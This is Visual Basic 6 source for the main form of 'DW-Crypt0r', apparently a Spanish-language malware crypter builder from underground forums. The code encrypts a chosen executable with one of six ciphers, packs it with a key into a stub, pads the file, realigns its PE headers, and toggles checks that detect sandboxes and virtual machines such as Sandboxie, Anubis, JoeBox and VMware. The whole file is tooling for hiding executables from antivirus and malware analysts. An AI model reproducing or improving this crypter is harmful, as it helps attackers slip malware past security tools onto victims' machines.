VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "                                                           -=DW-Crypt0r=-"
   ClientHeight    =   7935
   ClientLeft      =   3465
   ClientTop       =   1695
   ClientWidth     =   7455
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   9.75
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7935
   ScaleWidth      =   7455
   Begin MSComDlg.CommonDialog CD 
      Left            =   6960
      Top             =   360
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00FFFFFF&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   4815
      Left            =   120
      TabIndex        =   1
      Top             =   3000
      Width           =   7215
      Begin VB.PictureBox Picture2 
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   240
         Left            =   2040
         Picture         =   "Form1.frx":4781A
         ScaleHeight     =   240
         ScaleWidth      =   240
         TabIndex        =   38
         Top             =   240
         Width           =   240
      End
      Begin Proyecto1.XP_ProgressBar XP_ProgressBar1 
         Height          =   495
         Left            =   2640
         TabIndex        =   35
         Top             =   4200
         Width           =   4455
         _ExtentX        =   7858
         _ExtentY        =   873
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BrushStyle      =   0
         Color           =   65280
         Scrolling       =   9
      End
      Begin VB.Frame Frame6 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Exe-Pump  "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1095
         Left            =   120
         TabIndex        =   31
         Top             =   3000
         Width           =   2415
         Begin VB.PictureBox Picture5 
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            BorderStyle     =   0  'None
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Left            =   1080
            Picture         =   "Form1.frx":47DA4
            ScaleHeight     =   240
            ScaleWidth      =   240
            TabIndex        =   41
            Top             =   0
            Width           =   240
         End
         Begin VB.TextBox Text4 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Left            =   120
            Locked          =   -1  'True
            TabIndex        =   32
            Text            =   "0 bytes"
            Top             =   480
            Width           =   1215
         End
         Begin Proyecto1.Button Button1 
            Height          =   255
            Left            =   1440
            TabIndex        =   33
            Top             =   480
            Width           =   375
            _ExtentX        =   661
            _ExtentY        =   450
            ButtonStyle     =   7
            BackColor       =   14211288
            BackColorPressed=   15715986
            BackColorHover  =   16243621
            BorderColor     =   9408398
            BorderColorPressed=   6045981
            BorderColorHover=   11632444
            Caption         =   "+"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
         End
         Begin Proyecto1.Button Button2 
            Height          =   255
            Left            =   1920
            TabIndex        =   34
            Top             =   480
            Width           =   375
            _ExtentX        =   661
            _ExtentY        =   450
            ButtonStyle     =   7
            BackColor       =   14211288
            BackColorPressed=   15715986
            BackColorHover  =   16243621
            BorderColor     =   9408398
            BorderColorPressed=   6045981
            BorderColorHover=   11632444
            Caption         =   "-"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
         End
      End
      Begin VB.Frame Frame5 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Encriptaciones  "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1095
         Left            =   2640
         TabIndex        =   24
         Top             =   3000
         Width           =   4455
         Begin VB.PictureBox Picture6 
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            BorderStyle     =   0  'None
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Left            =   1440
            Picture         =   "Form1.frx":4832E
            ScaleHeight     =   240
            ScaleWidth      =   240
            TabIndex        =   42
            Top             =   0
            Width           =   240
         End
         Begin VB.OptionButton Option6 
            BackColor       =   &H00FFFFFF&
            Caption         =   "XOR"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   3480
            TabIndex        =   30
            Top             =   720
            Width           =   735
         End
         Begin VB.OptionButton Option5 
            BackColor       =   &H00FFFFFF&
            Caption         =   "TEA"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   1800
            TabIndex        =   29
            Top             =   720
            Width           =   735
         End
         Begin VB.OptionButton Option4 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Rijndael"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   240
            TabIndex        =   28
            Top             =   720
            Width           =   975
         End
         Begin VB.OptionButton Option3 
            BackColor       =   &H00FFFFFF&
            Caption         =   "RC4"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   3480
            TabIndex        =   27
            Top             =   360
            Width           =   735
         End
         Begin VB.OptionButton Option2 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Gost"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   1800
            TabIndex        =   26
            Top             =   360
            Width           =   735
         End
         Begin VB.OptionButton Option1 
            BackColor       =   &H00FFFFFF&
            Caption         =   "DES"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   240
            TabIndex        =   25
            Top             =   360
            Value           =   -1  'True
            Width           =   735
         End
      End
      Begin VB.Frame Frame4 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Anti-Debgugging  "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   975
         Left            =   2640
         TabIndex        =   15
         Top             =   2040
         Width           =   4455
         Begin VB.PictureBox Picture4 
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            BorderStyle     =   0  'None
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Left            =   1680
            Picture         =   "Form1.frx":488B8
            ScaleHeight     =   240
            ScaleWidth      =   240
            TabIndex        =   40
            Top             =   0
            Width           =   240
         End
         Begin VB.CheckBox Check8 
            BackColor       =   &H00FFFFFF&
            Caption         =   "VBox"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   3360
            TabIndex        =   23
            Top             =   600
            Width           =   975
         End
         Begin VB.CheckBox Check7 
            BackColor       =   &H00FFFFFF&
            Caption         =   "VPC"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   2520
            TabIndex        =   22
            Top             =   600
            Width           =   735
         End
         Begin VB.CheckBox Check6 
            BackColor       =   &H00FFFFFF&
            Caption         =   "VMWare"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   1200
            TabIndex        =   21
            Top             =   600
            Width           =   975
         End
         Begin VB.CheckBox Check5 
            BackColor       =   &H00FFFFFF&
            Caption         =   "JoeBox"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   120
            TabIndex        =   20
            Top             =   600
            Width           =   855
         End
         Begin VB.CheckBox Check4 
            BackColor       =   &H00FFFFFF&
            Caption         =   "SandBox"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   3360
            TabIndex        =   19
            Top             =   360
            Width           =   975
         End
         Begin VB.CheckBox Check3 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Anubis"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   2520
            TabIndex        =   18
            Top             =   360
            Width           =   855
         End
         Begin VB.CheckBox Check2 
            BackColor       =   &H00FFFFFF&
            Caption         =   "ThreatExpert"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   1200
            TabIndex        =   17
            Top             =   360
            Width           =   1335
         End
         Begin VB.CheckBox Check1 
            BackColor       =   &H00FFFFFF&
            Caption         =   "SandBoxie"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   120
            TabIndex        =   16
            Top             =   360
            Width           =   1095
         End
      End
      Begin VB.Frame Frame3 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Opciones "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   975
         Left            =   120
         TabIndex        =   3
         Top             =   2040
         Width           =   2415
         Begin VB.PictureBox Picture3 
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            BorderStyle     =   0  'None
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Left            =   960
            Picture         =   "Form1.frx":48E42
            ScaleHeight     =   240
            ScaleWidth      =   240
            TabIndex        =   39
            Top             =   0
            Width           =   240
         End
         Begin VB.CheckBox chkPE 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Re-AlignPE"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   1200
            TabIndex        =   14
            Top             =   480
            Width           =   1095
         End
         Begin VB.CheckBox chkEOF 
            BackColor       =   &H00FFFFFF&
            Caption         =   "EOF Data"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   120
            TabIndex        =   13
            Top             =   480
            Width           =   1095
         End
      End
      Begin VB.Frame Frame2 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Manejo de Archivos  "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1815
         Left            =   120
         TabIndex        =   2
         Top             =   240
         Width           =   6975
         Begin Proyecto1.Button cmdBuscar 
            Height          =   375
            Left            =   5880
            TabIndex        =   10
            Top             =   240
            Width           =   975
            _ExtentX        =   1720
            _ExtentY        =   661
            ButtonStyle     =   7
            PictureAlignment=   1
            BackColor       =   14211288
            BackColorPressed=   15715986
            BackColorHover  =   16243621
            BorderColor     =   9408398
            BorderColorPressed=   6045981
            BorderColorHover=   11632444
            Caption         =   "     Buscar"
            Picture         =   "Form1.frx":493CC
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
         End
         Begin VB.TextBox Text3 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   12
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   405
            Left            =   1080
            TabIndex        =   9
            Top             =   1200
            Width           =   4695
         End
         Begin VB.TextBox Text2 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   12
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   405
            Left            =   1080
            TabIndex        =   8
            Top             =   720
            Width           =   4695
         End
         Begin VB.TextBox Text1 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   12
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   405
            Left            =   1080
            TabIndex        =   7
            Top             =   240
            Width           =   4695
         End
         Begin Proyecto1.Button cmdStub 
            Height          =   375
            Left            =   5880
            TabIndex        =   11
            Top             =   720
            Width           =   975
            _ExtentX        =   1720
            _ExtentY        =   661
            ButtonStyle     =   7
            PictureAlignment=   1
            BackColor       =   14211288
            BackColorPressed=   15715986
            BackColorHover  =   16243621
            BorderColor     =   9408398
            BorderColorPressed=   6045981
            BorderColorHover=   11632444
            Caption         =   "      Buscar"
            Picture         =   "Form1.frx":49966
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
         End
         Begin Proyecto1.Button cmdGenerar 
            Height          =   375
            Left            =   5880
            TabIndex        =   12
            Top             =   1200
            Width           =   975
            _ExtentX        =   1720
            _ExtentY        =   661
            ButtonStyle     =   7
            PictureAlignment=   1
            BackColor       =   14211288
            BackColorPressed=   15715986
            BackColorHover  =   16243621
            BorderColor     =   9408398
            BorderColorPressed=   6045981
            BorderColorHover=   11632444
            Caption         =   "   Rnd"
            Picture         =   "Form1.frx":49F00
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
         End
         Begin VB.Label Label3 
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            Caption         =   "Key:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Left            =   360
            TabIndex        =   6
            Top             =   1320
            Width           =   435
         End
         Begin VB.Label Label2 
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            Caption         =   "Stub:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Left            =   360
            TabIndex        =   5
            Top             =   840
            Width           =   525
         End
         Begin VB.Label Label1 
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            Caption         =   "Archivo:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Left            =   120
            TabIndex        =   4
            Top             =   360
            Width           =   825
         End
      End
      Begin Proyecto1.Button cmdCrear 
         Height          =   255
         Left            =   120
         TabIndex        =   36
         Top             =   4200
         Width           =   2415
         _ExtentX        =   4260
         _ExtentY        =   450
         ButtonStyle     =   7
         BackColor       =   14211288
         BackColorPressed=   15715986
         BackColorHover  =   16243621
         BorderColor     =   9408398
         BorderColorPressed=   6045981
         BorderColorHover=   11632444
         Caption         =   "Encriptar!"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin Proyecto1.Button Button3 
         Height          =   255
         Left            =   120
         TabIndex        =   37
         Top             =   4440
         Width           =   2415
         _ExtentX        =   4260
         _ExtentY        =   450
         ButtonStyle     =   7
         BackColor       =   14211288
         BackColorPressed=   15715986
         BackColorHover  =   16243621
         BorderColor     =   9408398
         BorderColorPressed=   6045981
         BorderColorHover=   11632444
         Caption         =   "About...."
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
   End
   Begin VB.PictureBox Picture1 
      AutoSize        =   -1  'True
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3000
      Left            =   0
      Picture         =   "Form1.frx":4A49A
      ScaleHeight     =   3000
      ScaleWidth      =   7500
      TabIndex        =   0
      Top             =   0
      Width           =   7500
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub Button1_Click()
'--------------------------------------------------------------------------------------
'//-> AGREGAR
'--------------------------------------------------------------------------------------

    Text4.Text = Replace$(Text4.Text, " bytes", "")
    
    Text4.Text = Text4.Text + 1
    
    Text4.Text = Text4.Text & " bytes"

End Sub

Private Sub Button2_Click()
'--------------------------------------------------------------------------------------
'//-> RESTAR
'--------------------------------------------------------------------------------------

    If Text4.Text <> "0 bytes" Then
        
        Text4.Text = Replace$(Text4.Text, " bytes", "")
        
        Text4.Text = Text4.Text - 1
        
        Text4.Text = Text4.Text & " bytes"
        
    End If
        
End Sub

Private Sub Button3_Click()
    MsgBox "                           Coded By" & vbNewLine & vbNewLine & "              DARK_J4V13R & WHITE-R00T" & vbNewLine & vbNewLine & " Www.Indetectables.Net  Www.ForosPH.Org" & vbNewLine & vbNewLine & "Créditos a:" & vbNewLine & vbNewLine & "Karcrack : RunPE" & vbNewLine & "Cobein :   Antis y Realign PE", vbInformation, "Acerca de..."
End Sub
Private Sub cmdBuscar_Click()
'--------------------------------------------------------------------------------------
'//-> BUSCAR ARCHIVO
'--------------------------------------------------------------------------------------

    With CD
        .DialogTitle = "Seleccione el Archivo a encriptar!"
        .Filter = "Archivos Ejecutables EXE|*.exe"
        .flags = cdlOFNFileMustExist
        .ShowOpen
    End With
    
    If CD.Filename <> vbNullString Then

        Text1.Text = CD.Filename
        
    End If
    
    CD.Filename = vbNullString
    'Preguntale pues ¬¬
End Sub

Private Sub cmdCrear_Click()
'--------------------------------------------------------------------------------------
'//-> ENCRIPTAR
'--------------------------------------------------------------------------------------
    
    Dim Free    As Long
    Dim Stub    As String
    Dim EOF     As String
    Dim Data    As String
    Dim hRC4    As New clsRC4
    Dim hXOR    As New clsXOR
    Dim hTEA    As New clsTEA
    Dim hDES    As New clsDES
    Dim hGost   As New clsGost
    Dim hRIJ    As New clsRijndael
    Dim Antis   As String
    Dim Final   As String
    Dim i       As Long
    Dim Bytes   As String
    Dim Enc     As Integer
    
    Free = FreeFile
    
    With CD
        .DialogTitle = "Seleccione donde guardar el archivo encriptado!"
        .Filter = "Archivos ejecutables EXE|*.exe"
        .ShowSave
    End With
    
    If CD.Filename <> vbNullString Then
    
        Open Text2.Text For Binary As Free
            Stub = Space$(LOF(1))
            Get #1, , Stub
        Close Free
        
        XP_ProgressBar1.Value = 10
        
        '//-> ReadEOFData
        If chkEOF.Value = 1 Then EOF = ReadEOFData(Text1.Text)
        
        XP_ProgressBar1.Value = 20
        
        Open Text1.Text For Binary As Free
            Data = Space$(LOF(1))
            Get #1, , Data
        Close Free
        
        XP_ProgressBar1.Value = 50
        
        
        If Option1.Value = True Then Data = hDES.EncryptString(Data, Text3.Text): Enc = 1
        If Option2.Value = True Then Data = hGost.EncryptString(Data, Text3.Text): Enc = 2
        If Option3.Value = True Then Data = hRC4.EncryptString(Data, Text3.Text): Enc = 3
        If Option4.Value = True Then Data = hRIJ.EncryptString(Data, Text3.Text): Enc = 4
        If Option5.Value = True Then Data = hTEA.EncryptString(Data, Text3.Text): Enc = 5
        If Option6.Value = True Then Data = hXOR.EncryptString(Data, Text3.Text): Enc = 6
        
        XP_ProgressBar1.Value = 60
        
        Antis = Check1.Value & "[Antis]" & Check2.Value & "[Antis]" & Check3.Value & "[Antis]" & Check4.Value & "[Antis]" & Check5.Value & "[Antis]" & Check6.Value & "[Antis]" & Check7.Value & "[Antis]" & Check8.Value
        
        XP_ProgressBar1.Value = 70
        
        Final = Data & "[DW-Crypt0r]" & Antis & "[DW-Crypt0r]" & Text3.Text & "[DW-Crypt0r]" & Enc
        
        XP_ProgressBar1.Value = 80
        
        Open CD.Filename For Binary As Free
            Put #1, , Stub & "[DW-Crypt0r]"
            Put #1, , Final
        Close #1
        
        XP_ProgressBar1.Value = 85
        
        If Text4.Text <> "0 bytes" Then
            
            Bytes = Replace$(Text4.Text, " bytes", "")
            
            For i = 1 To Bytes
                
                Open CD.Filename For Append As #1
                    
                    Print #1, LOF(1), " "
                    
                Close #1
            
            Next i
            
        End If
        
        XP_ProgressBar1.Value = 95
        
        If chkEOF.Value = 1 Then Call WriteEOFData(CD.Filename, EOF)
        
        '//-> Re-Align PE
        If chkPE.Value = 1 Then Call RealignPEFromFile(CD.Filename)
        
        XP_ProgressBar1.Value = 100
        
        MsgBox "Archivo encriptado correctamente!", vbInformation, "DW-Cypt0r"
        
        XP_ProgressBar1.Value = 0
        
    End If
    
    
End Sub

Private Sub cmdGenerar_Click()
'--------------------------------------------------------------------------------------
'//-> KEY
'--------------------------------------------------------------------------------------

    Text3.Text = Aleatorio(50)

End Sub

Private Sub cmdStub_Click()
'--------------------------------------------------------------------------------------
'//-> BUSCAR STUB
'--------------------------------------------------------------------------------------

    With CD
        .DialogTitle = "Seleccione el Stub que desea utilizar!"
        .Filter = "Archivos ejecutables EXE|*.exe|Librerias DLL|*.dll"
        .flags = cdlOFNFileMustExist
        .ShowOpen
    End With
    
    If CD.Filename <> vbNullString Then
    
        Text2.Text = CD.Filename
        
    End If
    
    CD.Filename = vbNullString

End Sub

Function Aleatorio(Tamaño As String) As String ' // By Karcrack
'--------------------------------------------------------------------------------------
'//-> GENERADOR DE PASSWORDS
'--------------------------------------------------------------------------------------

    Dim i
    
    For i = 1 To Tamaño
        Randomize
        Aleatorio = Aleatorio & Chr$(CLng((5 - 90) * Rnd + 90))
    Next i
    
End Function
